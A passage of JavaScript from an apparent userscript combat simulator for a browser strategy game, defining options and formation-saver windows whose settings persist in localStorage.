                    var genPage = new qx.ui.tabview.Page("General"); 
                    genLayout = new qx.ui.layout.VBox(5); 
                    genPage.setLayout(genLayout); 
 
                    //Add General Page Items 
                    var buttonsHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                    buttonsHeader.setThemedFont("bold"); 
                    var buttonsTitle = new qx.ui.basic.Label("Buttons:"); 
                    buttonsHeader.add(buttonsTitle); 
                    genPage.add(buttonsHeader); 
 
                    var buttonsBox = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)); 
                    this._buttonLocCB = new qx.ui.form.CheckBox("Right Side"); 
                    this._buttonSizeCB = new qx.ui.form.CheckBox("Normal Size"); 
                    this._buttonLocCB.addListener("changeValue", this._onButtonLocChange, this); 
                    this._buttonSizeCB.addListener("changeValue", this._onButtonSizeChange, this); 
                    if (localStorage['isBtnRight'] !== undefined) { 
                        if (localStorage['isBtnRight'] == "yes") 
                            this._buttonLocCB.setValue(true); 
                        else 
                            this._buttonLocCB.setValue(false); 
                    } 
 
                    if (localStorage['isBtnNorm'] !== undefined) { 
                        if (localStorage['isBtnNorm'] == "yes") 
                            this._buttonSizeCB.setValue(true); 
                        else 
                            this._buttonSizeCB.setValue(false); 
 
                        //Need to do this 
                        this.setButtonSize(); 
                    } 
 
                    this._disableRTBtnCB = new qx.ui.form.CheckBox("Disable Repair Button"); 
                    this._disableRTBtnCB.addListener("changeValue", this._onDisableRTBtnChange, this); 
                    if (localStorage['isRTBtnDisabled'] !== undefined) { 
                        if (localStorage['isRTBtnDisabled'] == "yes") 
                            this._disableRTBtnCB.setValue(true); 
                        else 
                            this._disableRTBtnCB.setValue(false); 
                    } 
 
                    this._disableCmtBtnCB = new qx.ui.form.CheckBox("Disable Combat Button"); 
                    this._disableCmtBtnCB.addListener("changeValue", this._onDisableCmtBtnChange, this); 
                    if (localStorage['isCmtBtnDisabled'] !== undefined) { 
                        if (localStorage['isCmtBtnDisabled'] == "yes") 
                            this._disableCmtBtnCB.setValue(true); 
                        else 
                            this._disableCmtBtnCB.setValue(false); 
                    } 
 
                    this._ArmyUnitTooltip = new qx.ui.form.CheckBox("Disable Army Unit Tooltip"); 
                    this._ArmyUnitTooltip.addListener("changeValue", this._onArmyUnitTooltipChange, this); 
                    if (localStorage['ArmyUnitTooltipDisabled'] !== undefined) { 
                        if (localStorage['ArmyUnitTooltipDisabled'] == "yes") 
                            this._ArmyUnitTooltip.setValue(true); 
                        else 
                            this._ArmyUnitTooltip.setValue(false); 
                    } 
 
                    buttonsBox.add(this._buttonSizeCB); 
                    buttonsBox.add(this._buttonLocCB); 
                    buttonsBox.add(this._disableRTBtnCB); 
                    buttonsBox.add(this._disableCmtBtnCB); 
                    buttonsBox.add(this._ArmyUnitTooltip); 
                    genPage.add(buttonsBox); 
 
 
 
                    var simulatorHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({ 
                        marginTop: 10 
                    }); 
                    simulatorHeader.setThemedFont("bold"); 
                    var simulatorTitle = new qx.ui.basic.Label("Simulator:"); 
                    simulatorHeader.add(simulatorTitle); 
                    genPage.add(simulatorHeader); 
 
                    var simulatorBox = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)); 
                    this._autoSimulateCB = new qx.ui.form.CheckBox("Auto Start Simulation"); 
 
                    if (localStorage['autoSimulate'] !== undefined) { 
                        if (localStorage['autoSimulate'] == "yes") 
                            this._autoSimulateCB.setValue(true); 
                    } 
 
                    var simulatorBox2 = new qx.ui.container.Composite(new qx.ui.layout.Grid(5)).set({ 
                        marginLeft: 20 
                    }); 
                    var simSpeedOpt1 = new qx.ui.form.RadioButton("x1"); 
                    var simSpeedOpt2 = new qx.ui.form.RadioButton("x2"); 
                    var simSpeedOpt4 = new qx.ui.form.RadioButton("x4"); 
                    this._simSpeedGroup = new qx.ui.form.RadioGroup(simSpeedOpt1, simSpeedOpt2, simSpeedOpt4); 
                    this._simSpeedGroup.addListener("changeSelection", this._onSimSpeedChange, this); 
                    this._autoSimulateCB.addListener("changeValue", this._onAutoSimulateChange, this); 
                    if (localStorage['simulateSpeed'] !== undefined) { 
                        var options = this._simSpeedGroup.getSelectables(false); 
 
                        if (localStorage['simulateSpeed'] == "2") 
                            options[1].setValue(true); 
                        else if (localStorage['simulateSpeed'] == "4") 
                            options[2].setValue(true); 
                        else 
                            options[0].setValue(true); 
                    } 
                    if (this._autoSimulateCB.getValue() == false) { 
                        this._simSpeedGroup.setEnabled(false); 
                    } 
 
                    simulatorBox2.add(simSpeedOpt1, {row: 0, column: 0}); 
                    simulatorBox2.add(simSpeedOpt2, {row: 0, column: 1}); 
                    simulatorBox2.add(simSpeedOpt4, {row: 0, column: 2}); 
                    simulatorBox.add(this._autoSimulateCB); 
                    simulatorBox.add(simulatorBox2); 
                    genPage.add(simulatorBox); 
 
                    var statsPage = new qx.ui.tabview.Page("Stats"); 
                    statsLayout = new qx.ui.layout.VBox(5); 
                    statsPage.setLayout(statsLayout); 
 
                    var statWindowHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                    statWindowHeader.setThemedFont("bold"); 
                    var statWindowTitle = new qx.ui.basic.Label("Stat Window:"); 
                    statWindowHeader.add(statWindowTitle); 
                    statsPage.add(statWindowHeader); 
 
                    var statWindowBox = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)); 
                    this._autoOpenCB = new qx.ui.form.CheckBox("Auto Open"); 
                    this._autoOpenCB.addListener("changeValue", this._onAutoOpenStatsChange, this); 
                    if (localStorage['autoOpenStat'] !== undefined) { 
                        if (localStorage['autoOpenStat'] == "yes") 
                            this._autoOpenCB.setValue(true); 
                        else 
                            this._autoOpenCB.setValue(false); 
                    } 
 
                    statWindowBox.add(this._autoOpenCB); 
                    statsPage.add(statWindowBox); 
 
                    var EnemyHealthSecHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({ 
                        marginTop: 10 
                    }); 
                    EnemyHealthSecHeader.setThemedFont("bold"); 
                    var EnemyHealthSecTitle = new qx.ui.basic.Label(qxApp.tr("tnf:combat target")); 
                    EnemyHealthSecHeader.add(EnemyHealthSecTitle); 
                    statsPage.add(EnemyHealthSecHeader); 
 
                    var EnemyHealthSecBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                    var EnemyHealthDisplayOpt1 = new qx.ui.form.RadioButton("HP abs"); 
                    var EnemyHealthDisplayOpt2 = new qx.ui.form.RadioButton("HP rel"); 
                    this._EnemyHealthSecGroup = new qx.ui.form.RadioGroup(EnemyHealthDisplayOpt1, EnemyHealthDisplayOpt2); 
                    this._EnemyHealthSecGroup.addListener("changeSelection", this._onEnemyHealthSelectionChange, this); 
                    if (localStorage['getEHSelection'] !== undefined) { 
                        var options = this._EnemyHealthSecGroup.getSelectables(false); 
 
                        if (localStorage['getEHSelection'] == "hp") 
                            options[0].setValue(true); 
                        else if (localStorage['getEHSelection'] == "hp rel") 
                            options[1].setValue(true); 
                        else 
                            options[0].setValue(true); 
                    } 
                    EnemyHealthSecBox.add(EnemyHealthDisplayOpt1); 
                    EnemyHealthSecBox.add(EnemyHealthDisplayOpt2); 
                    statsPage.add(EnemyHealthSecBox); 
 
                    var repairSecHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({ 
                        marginTop: 10 
                    }); 
                    repairSecHeader.setThemedFont("bold"); 
                    var repairSecTitle = new qx.ui.basic.Label(qxApp.tr("tnf:own repair cost")); 
                    repairSecHeader.add(repairSecTitle); 
                    statsPage.add(repairSecHeader); 
 
                    var repairSecBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                    var repairDisplayOpt1 = new qx.ui.form.RadioButton("RT"); 
                    var repairDisplayOpt2 = new qx.ui.form.RadioButton("C"); 
                    var repairDisplayOpt3 = new qx.ui.form.RadioButton("HP abs"); 
                    var repairDisplayOpt4 = new qx.ui.form.RadioButton("HP rel"); 
                    this._repairSecGroup = new qx.ui.form.RadioGroup(repairDisplayOpt1, repairDisplayOpt2, repairDisplayOpt3, repairDisplayOpt4); 
                    this._repairSecGroup.addListener("changeSelection", this._onRepairSelectionChange, this); 
                    if (localStorage['getRTSelection'] !== undefined) { 
                        var options = this._repairSecGroup.getSelectables(false); 
 
                        if (localStorage['getRTSelection'] == "rt") 
                            options[0].setValue(true); 
                        else if (localStorage['getRTSelection'] == "cry") 
                            options[1].setValue(true); 
                        else if (localStorage['getRTSelection'] == "hp") 
                            options[2].setValue(true); 
                        else if (localStorage['getRTSelection'] == "hp rel") 
                            options[3].setValue(true); 
                        else 
                            options[0].setValue(true); 
                    } 
                    repairSecBox.add(repairDisplayOpt1); 
                    repairSecBox.add(repairDisplayOpt2); 
                    repairSecBox.add(repairDisplayOpt3); 
                    repairSecBox.add(repairDisplayOpt4); 
                    statsPage.add(repairSecBox); 
 
                    var simViewsHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({marginTop: 10}); 
                    simViewsHeader.setThemedFont("bold"); 
                    var simViewsTitle = new qx.ui.basic.Label("Simulations shown"); 
                    simViewsHeader.add(simViewsTitle); 
                    statsPage.add(simViewsHeader); 
 
                    var simViewsBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(10)); 
                    this._simViews = new qx.ui.form.Spinner().set({ minimum: 2 }); 
                    if (localStorage['simViews'] !== undefined) { 
                        if (!isNaN(parseInt(localStorage['simViews'], 10))) this._simViews.setValue(parseInt(localStorage['simViews'], 10)); 
                        else this._simViews.setValue(Simulator.StatWindow.getInstance().simViews); 
                    } 
                    this._simViews.addListener("changeValue", this._onSimViewsChanged, this); 
                    simViewsBox.add(this._simViews); 
                    statsPage.add(simViewsBox); 
 
                    var hideSecHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({marginTop: 10}); 
                    hideSecHeader.setThemedFont("bold"); 
                    var hideSecTitle = new qx.ui.basic.Label("Hide Sections (on Startup):"); 
                    hideSecHeader.add(hideSecTitle); 
                    statsPage.add(hideSecHeader); 
 
                    var hideSecBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(10)); 
                    this._hideHealthCB = new qx.ui.form.CheckBox("Health"); 
                    this._hideRepairCB = new qx.ui.form.CheckBox("Repair"); 
                    this._hideLootCB = new qx.ui.form.CheckBox("Loot"); 
                    this._hideHealthCB.addListener("changeValue", this._onHideEHChange, this); 
                    this._hideRepairCB.addListener("changeValue", this._onHideRTChange, this); 
                    this._hideLootCB.addListener("changeValue", this._onHideLootChange, this); 
                    if (localStorage['hideHealth'] !== undefined) { 
                        if (localStorage['hideHealth'] == "yes") 
                            this._hideHealthCB.setValue(true); 
                        else 
                            this._hideHealthCB.setValue(false); 
                    } 
                    if (localStorage['hideRepair'] !== undefined) { 
                        if (localStorage['hideRepair'] == "yes") 
                            this._hideRepairCB.setValue(true); 
                        else 
                            this._hideRepairCB.setValue(false); 
                    } 
                    if (localStorage['hideLoot'] !== undefined) { 
                        if (localStorage['hideLoot'] == "yes") 
                            this._hideLootCB.setValue(true); 
                        else 
                            this._hideLootCB.setValue(false); 
                    } 
                    hideSecBox.add(this._hideHealthCB); 
                    hideSecBox.add(this._hideRepairCB); 
                    hideSecBox.add(this._hideLootCB); 
                    statsPage.add(hideSecBox); 
 
                    var statPosHeader = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({marginTop: 10}); 
                    var statPosTitle = new qx.ui.basic.Label("Set Stat Window Position:").set({alignY: "middle"}); 
                    statPosTitle.setFont("bold"); 
                    var statPosBtn = new qx.ui.form.Button("Set").set({allowGrowX: false, allowGrowY: false, height: 20}); 
                    statPosBtn.addListener("click", this._onSetStatWindowPositionChange, this); 
                    statPosHeader.add(statPosTitle); 
                    statPosHeader.add(statPosBtn); 
                    statsPage.add(statPosHeader); 
 
                    tabView.add(genPage); 
                    tabView.add(statsPage); 
                    this.add(tabView); 
                    phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "ViewModeChange", ClientLib.Vis.ViewModeChange, this, function () { this.close(); }); 
                }, 
 
                destruct: function () {}, 
 
                members: { 
                    _buttonSizeCB: null, 
                    _buttonLocCB: null, 
                    _disableRTBtnCB: null, 
                    _disableCmtBtnCB: null, 
                    _autoOpenCB: null, 
                    _autoSimulateCB: null, 
                    _simSpeedGroup: null, 
                    _repairSecGroup: null, 
                    _EnemyHealthSecGroup: null, 
                    _simViews: null, 
                    _hideHealthCB: null, 
                    _hideRepairCB: null, 
                    _hideLootCB: null, 
                    _ArmyUnitTooltip: null, 
 
                    _onButtonSizeChange: function () { 
                        try { 
                            var value = this._buttonSizeCB.getValue(); 
 
                            if (value == true) 
                                localStorage['isBtnNorm'] = "yes"; 
                            else 
                                localStorage['isBtnNorm'] = "no"; 
 
                            this.setButtonSize(); 
                        } catch (e) { 
                            console.log("Error Button Size Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onButtonLocChange: function () { 
                        try { 
                            var value = this._buttonLocCB.getValue(); 
 
                            if (value == true) 
                                localStorage['isBtnRight'] = "yes"; 
                            else 
                                localStorage['isBtnRight'] = "no"; 
 
                            this.setButtonLoc(); 
                        } catch (e) { 
                            console.log("Error Button Location Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onDisableRTBtnChange: function () { 
                        try { 
                            var value = this._disableRTBtnCB.getValue(); 
 
                            if (value == true) 
                                localStorage['isRTBtnDisabled'] = "yes"; 
                            else 
                                localStorage['isRTBtnDisabled'] = "no"; 
 
                            this.setRTBtn(value); 
                        } catch (e) { 
                            console.log("Error Disable RT Button Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onDisableCmtBtnChange: function () { 
                        try { 
                            var value = this._disableCmtBtnCB.getValue(); 
 
                            if (value == true) 
                                localStorage['isCmtBtnDisabled'] = "yes"; 
                            else 
                                localStorage['isCmtBtnDisabled'] = "no"; 
 
                            this.setCmtBtn(value); 
                        } catch (e) { 
                            console.log("Error Disable Cmt Button Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onEnemyHealthSelectionChange: function (selection) { 
                        try { 
                            var option = selection.getData()[0]; 
                            var label = option.getLabel(); 
 
                            if (label == "HP abs") 
                                localStorage['getEHSelection'] = "hp"; 
                            else if (label == "HP rel") 
                                localStorage['getEHSelection'] = "hp rel"; 
                            else 
                                localStorage['getEHSelection'] = "hp"; 
                        } catch (e) { 
                            console.log("Error Enemy Health Section Selection Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onRepairSelectionChange: function (selection) { 
                        try { 
                            var option = selection.getData()[0]; 
                            var label = option.getLabel(); 
 
                            if (label == "RT") 
                                localStorage['getRTSelection'] = "rt"; 
                            else if (label == "HP abs") 
                                localStorage['getRTSelection'] = "hp"; 
                            else if (label == "HP rel") 
                                localStorage['getRTSelection'] = "hp rel"; 
                            else if (label == "C") 
                                localStorage['getRTSelection'] = "cry"; 
                            else 
                                localStorage['getRTSelection'] = "rt"; 
                        } catch (e) { 
                            console.log("Error Repair Section Selection Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onAutoOpenStatsChange: function () { 
                        try { 
                            var value = this._autoOpenCB.getValue(); 
 
                            if (value == false) 
                                localStorage['autoOpenStat'] = "no"; 
                            else 
                                localStorage['autoOpenStat'] = "yes"; 
                        } catch (e) { 
                            console.log("Error Auto Open Stats Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onArmyUnitTooltipChange: function () { 
                        try { 
                            var value = this._ArmyUnitTooltip.getValue(); 
 
                            if (value == false) 
                                localStorage['ArmyUnitTooltipDisabled'] = "no"; 
                            else 
                                localStorage['ArmyUnitTooltipDisabled'] = "yes"; 
                        } catch (e) { 
                            console.log("Error Army Unit Tooltip Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onAutoSimulateChange: function () { 
                        try { 
                            var value = this._autoSimulateCB.getValue(); 
                            if (value == false) { 
                                this._simSpeedGroup.setEnabled(false); 
                                localStorage['autoSimulate'] = "no"; 
                            } else { 
                                this._simSpeedGroup.setEnabled(true); 
                                localStorage['autoSimulate'] = "yes"; 
                            } 
                        } catch (e) { 
                            console.log("Error Auto Simulate Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onSimSpeedChange: function (selection) { 
                        try { 
                            var option = selection.getData()[0]; 
                            var label = option.getLabel(); 
 
                            if (label == "x1") 
                                localStorage['simulateSpeed'] = "1"; 
                            else if (label == "x2") 
                                localStorage['simulateSpeed'] = "2"; 
                            else 
                                localStorage['simulateSpeed'] = "4"; 
                        } catch (e) { 
                            console.log("Error Sim Speed Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onSimViewsChanged: function () { 
                        try { 
                            var value = parseInt(this._simViews.getValue(), 10); 
                            if (!isNaN(value)) { 
                                if (value > 0) { 
                                    localStorage['simViews'] = value.toString(); 
                                    Simulator.StatWindow.getInstance().simViews = value; 
 
                                    // Remove Simulations from Stats Window 
                                    for (var i = (Simulator.StatWindow.getInstance().sim.length-1); i >= 0; i--) { 
                                        if (i > (value-1)) { 
                                            Simulator.StatWindow.getInstance().Battle.remove(Simulator.StatWindow.getInstance().sim[i].Label.Battle.container); 
                                            Simulator.StatWindow.getInstance().EnemyHealth.remove(Simulator.StatWindow.getInstance().sim[i].Label.EnemyHealth.container); 
                                            Simulator.StatWindow.getInstance().Repair.remove(Simulator.StatWindow.getInstance().sim[i].Label.Repair.container); 
                                            Simulator.StatWindow.getInstance().Loot.remove(Simulator.StatWindow.getInstance().sim[i].Label.Loot.container); 
                                            Simulator.StatWindow.getInstance().sim.pop(); 
                                        } 
                                    } 
 
                                    // Create and add Simulations to Stats Window 
                                    for (var i = 0; i < value; i++) { 
                                        if (i == Simulator.StatWindow.getInstance().sim.length) { 
                                            Simulator.StatWindow.getInstance().sim.push(new (Simulator.StatWindow.getInstance()).Simulation(i)); 
                                            Simulator.StatWindow.getInstance().Battle.add(Simulator.StatWindow.getInstance().sim[i].Label.Battle.container, { flex : 1 }); 
                                            Simulator.StatWindow.getInstance().EnemyHealth.add(Simulator.StatWindow.getInstance().sim[i].Label.EnemyHealth.container, { flex : 1 }); 
                                            Simulator.StatWindow.getInstance().Repair.add(Simulator.StatWindow.getInstance().sim[i].Label.Repair.container, { flex : 1 }); 
                                            Simulator.StatWindow.getInstance().Loot.add(Simulator.StatWindow.getInstance().sim[i].Label.Loot.container, { flex : 1 }); 
                                            Simulator.StatWindow.getInstance().sim[i].Select(Simulator.StatWindow.getInstance().simSelected); 
                                        } 
                                    } 
 
                                    if ((value-1) < Simulator.StatWindow.getInstance().simSelected) { 
                                        Simulator.StatWindow.getInstance().simSelected = 0; 
                                        for (var i = 0; i < Simulator.StatWindow.getInstance().sim.length; i++) { 
                                            Simulator.StatWindow.getInstance().sim[i].Select(0); 
                                        } 
                                    } 
                                } 
                            } 
                        } catch (e) { 
                            console.log("Error Simulation Views Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onHideEHChange: function () { 
                        try { 
                            var value = this._hideHealthCB.getValue(); 
 
                            if (value == true) 
                                localStorage['hideHealth'] = "yes"; 
                            else 
                                localStorage['hideHealth'] = "no"; 
 
                        } catch (e) { 
                            console.log("Error Hide Enemy Base Health Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onHideRTChange: function () { 
                        try { 
                            var value = this._hideRepairCB.getValue(); 
 
                            if (value == true) 
                                localStorage['hideRepair'] = "yes"; 
                            else 
                                localStorage['hideRepair'] = "no"; 
 
                        } catch (e) { 
                            console.log("Error Hide Repair Times Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onHideLootChange: function () { 
                        try { 
                            var value = this._hideLootCB.getValue(); 
 
                            if (value == true) 
                                localStorage['hideLoot'] = "yes"; 
                            else 
                                localStorage['hideLoot'] = "no"; 
 
                        } catch (e) { 
                            console.log("Error Hide Loot Change: " + e.toString()); 
                        } 
                    }, 
 
                    _onSetStatWindowPositionChange: function () { 
                        try { 
                            var props = Simulator.StatWindow.getInstance().getLayoutProperties(); 
                            localStorage['statWindowPosLeft'] = props["left"]; 
                            localStorage['statWindowPosTop'] = props["top"]; 
                        } catch (e) { 
                            console.log("Error Stat Window Position Change: " + e.toString()); 
                        } 
                    }, 
 
                    setRTBtn: function (value) { 
                        if (value == true) 
                            Simulator.getInstance().unlockRTBtn.hide(); 
                        else 
                            Simulator.getInstance().unlockRTBtn.show(); 
                    }, 
 
                    setCmtBtn: function (value) { 
                        if (value == true) 
                            Simulator.getInstance().unlockCmtBtn.hide(); 
                        else 
                            Simulator.getInstance().unlockCmtBtn.show(); 
                    }, 
 
                    setButtonLoc: function () { 
                        try { 
                            var value = this._buttonLocCB.getValue(); 
                            var size = this._buttonSizeCB.getValue(); 
 
                            if (value == true) //Right 
                            { 
                                var pLeft = null; 
                                if (size == true) //Right Normal 
                                    var pRight = 70; 
                                else //Right Small 
                                    var pRight = 70; 
 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().simBtn, {left: pLeft, right: pRight, bottom: 119}); 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().statBtn, {left: pLeft, right: pRight, bottom: 81}); 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().optionBtn, {left: pLeft, right: pRight, bottom: 43}); 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().layoutBtn, {left: pLeft, right: pRight, bottom: 5}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftUpBtn, {left: pLeft, right: 75, bottom: 113}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftDownBtn, {left: pLeft, right: 75, bottom: 73}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftLeftBtn, {left: pLeft, right: 95, bottom: 93}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftRightBtn, {left: pLeft, right: 55, bottom: 93}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().disableAllUnitsBtn, {left: pLeft, right: 6, bottom: 120}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().mirrorBtnH, {left: pLeft, right: 6, bottom: 160}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().mirrorBtnV, {left: pLeft, right: 46, bottom: 160}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().armyUndoBtn, {left: pLeft, right: 6, bottom: 200}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().quickSaveBtn, {left: pLeft, right: 6, bottom: 240}); 
                            } else { 
                                var pRight = null; 
                                if (size == true) //Left Normal 
                                    var pLeft = 87; 
                                else 
                                    var pLeft = 87; 
 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().simBtn, {left: pLeft, right: pRight, bottom: 120}); 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().statBtn, {left: pLeft, right: pRight, bottom: 82}); 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().optionBtn, {left: pLeft, right: pRight, bottom: 44}); 
                                Simulator.getInstance().armyBar.add(Simulator.getInstance().layoutBtn, {left: pLeft, right: pRight, bottom: 6}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftUpBtn, {left: 80, right: pRight, bottom: 113}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftDownBtn, {left: 80, right: pRight, bottom: 73}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftLeftBtn, {left: 60, right: pRight, bottom: 93}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().shiftRightBtn, {left: 100, right: pRight, bottom: 93}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().disableAllUnitsBtn, {left: 6, right: pRight, bottom: 120}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().mirrorBtnH, {left: 6, right: pRight, bottom: 160}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().mirrorBtnV, {left: 46, right: pRight, bottom: 160}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().armyUndoBtn, {left: 6, right: pRight, bottom: 200}); 
                                Simulator.getInstance().playArea.add(Simulator.getInstance().quickSaveBtn, {left: 6, right: pRight, bottom: 240}); 
                            } 
                        } catch (e) { 
                            console.log("Error Setting Button Location: " + e.toString()); 
                        } 
                    }, 
 
                    setButtonSize: function () { 
                        try { 
                            value = this._buttonSizeCB.getValue(); 
 
                            if (value == true) { 
                                Simulator.getInstance().simBtn.setLabel("Simulate"); 
                                Simulator.getInstance().simBtn.setWidth(60); 
 
                                Simulator.getInstance().statBtn.setLabel("Stats"); 
                                Simulator.getInstance().statBtn.setWidth(60); 
 
                                Simulator.getInstance().optionBtn.setLabel("Options"); 
                                Simulator.getInstance().optionBtn.setWidth(60); 
 
                                Simulator.getInstance().layoutBtn.setLabel("Layout"); 
                                Simulator.getInstance().layoutBtn.setWidth(60); 
                            } else { 
                                Simulator.getInstance().simBtn.setLabel("S"); 
                                Simulator.getInstance().simBtn.setWidth(30); 
 
                                Simulator.getInstance().statBtn.setLabel("I"); 
                                Simulator.getInstance().statBtn.setWidth(30); 
 
                                Simulator.getInstance().optionBtn.setLabel("O"); 
                                Simulator.getInstance().optionBtn.setWidth(30); 
 
                                Simulator.getInstance().layoutBtn.setLabel("L"); 
                                Simulator.getInstance().layoutBtn.setWidth(30); 
                            } 
 
                            this.setButtonLoc(); 
                        } catch (e) { 
                            console.log("Error Setting Button Size: " + e.toString()); 
                        } 
                    } 
                } 
            }); 
            qx.Class.define("Simulator.LayoutWindow", { 
                type: "singleton", 
                extend: webfrontend.gui.CustomWindow, 
 
                construct: function () { 
                    this.base(arguments); 
                    this.setLayout(new qx.ui.layout.VBox()); 
 
                    this.set({ 
                        width: 200, 
                        caption: "Simulator Layouts", 
                        padding: 2, 
                        allowMaximize: false, 
                        showMaximize: false, 
                        allowMinimize: false, 
                        showMinimize: false 
                    }); 
 
                    var layoutListHeader = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({ 
                        decorator: "pane-light-opaque" 
                    }); 
                    var layoutListTitle = new qx.ui.basic.Label("Formation Saver").set({alignX: "center", alignY: "top", font: "font_size_14_bold"}); 
                    layoutListHeader.add(layoutListTitle); 
                    this.add(layoutListHeader); 
 
                    this.layoutList = new qx.ui.form.List(); 
                    this.layoutList.set({selectionMode: "one", height: 100, width: 150, margin: 5}); 
                    this.add(this.layoutList); 
 
                    var listButtonBox = new qx.ui.container.Composite(); 
                    var listButtonLayout = new qx.ui.layout.HBox(5, "center"); 
                    listButtonBox.setLayout(listButtonLayout); 
                    var loadButton = new qx.ui.form.Button("Load"); 
                    var deleteButton = new qx.ui.form.Button("Delete"); 
                    loadButton.set({height: 15, width: 70, alignX: "center"}); 
                    loadButton.addListener("click", this.loadLayout, this); 
                    deleteButton.set({height: 15, width: 70, alignX: "center"}); 
                    deleteButton.addListener("click", this.deleteLayout, this); 
                    listButtonBox.add(loadButton); 
                    listButtonBox.add(deleteButton); 
                    this.add(listButtonBox); 
 
                    var saveLayoutBox = new qx.ui.container.Composite(new qx.ui.layout.HBox().set({spacing: 10})).set({marginTop: 20, marginLeft: 5}); 
                    this.layoutTextBox = new qx.ui.form.TextField("").set({width: 75, maxLength: 15}); 
                    var saveButton = new qx.ui.form.Button("Save"); 
                    saveButton.set({height: 10, width: 70, alignX: "center"}); 
                    saveButton.addListener("click", this.saveNewLayout, this); 
                    saveLayoutBox.add(this.layoutTextBox); 
                    saveLayoutBox.add(saveButton); 
                    this.add(saveLayoutBox); 
 
                    var checkBox = new qx.ui.container.Composite(new qx.ui.layout.HBox().set({spacing: 10})).set({marginTop: 10, marginLeft: 5}); 
                    this.persistentCheck = new qx.ui.form.CheckBox("Make Persistent"); 
                    this.persistentCheck.setTextColor("white"); 
                    this.persistentCheck.setFont("bold"); 
                    this.persistentCheck.setToolTipText("If checked, formation will be saved and can be used by this city in any other city"); 
                    checkBox.add(this.persistentCheck); 
                    this.add(checkBox); 
 
                    var noticeBox = new qx.ui.container.Composite(new qx.ui.layout.HBox()).set({marginTop: 5, marginLeft: 5}); 
                    var noticeText = new qx.ui.basic.Label("").set({alignX: "center", alignY: "top"}); 
                    noticeText.setValue("<p align=\'justify\'><b>If formation does not change on load, try moving one unit first, then try again.</b></p>"); 
                    noticeText.set({rich: true, wrap: true, width: 165, textColor: "white"}); 
                    noticeBox.add(noticeText); 
                    this.add(noticeBox); 
 
                    var clearAllLayoutsBox = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({alignX: "center", marginTop: 5, marginLeft: 5, allowGrowX: false}); 
                    var clearAllLayoutsBtn = new qx.ui.form.Button("Clear All").set({alignX: "center", width: 70}); 
                    clearAllLayoutsBtn.addListener("click", this.clearAllLayouts, this); 
                    clearAllLayoutsBox.add(clearAllLayoutsBtn); 
                    this.add(clearAllLayoutsBox); 
 
                    this.layoutsArray = []; 
                    phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "ViewModeChange", ClientLib.Vis.ViewModeChange, this, function () { this.close(); }); 
                }, 
 
                destruct: function () {}, 
 
                members: { 
                    layoutList: null, 
                    layoutTextBox: null, 
                    layoutsArray: null, 
                    persistentCheck: null, 
 
                    saveNewLayout: function (isQS) { 
                        try { 
                            console.log("Saving Layout"); 
 
                            if ((isQS !== undefined && isQS == true) || this.layoutTextBox.getValue() == "") { 
                                var date = new Date(); 
                                var day = date.getDate(); 
                                var month = date.getMonth() + 1; 
                                var hour = (date.getHours() < 10) ? "0" + date.getHours() : date.getHours(); 
                                var minute = (date.getMinutes() < 10) ? "0" + date.getMinutes() : date.getMinutes(); 
                                var second = (date.getSeconds() < 10) ? "0" + date.getSeconds() : date.getSeconds(); 
                                var label = month + "/" + day + "@" + hour + ":" + minute + ":" + second; 
                            } else { 
                                var label = this.layoutTextBox.getValue(); 
                            } 
 
                            var cityID = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCityId(); 
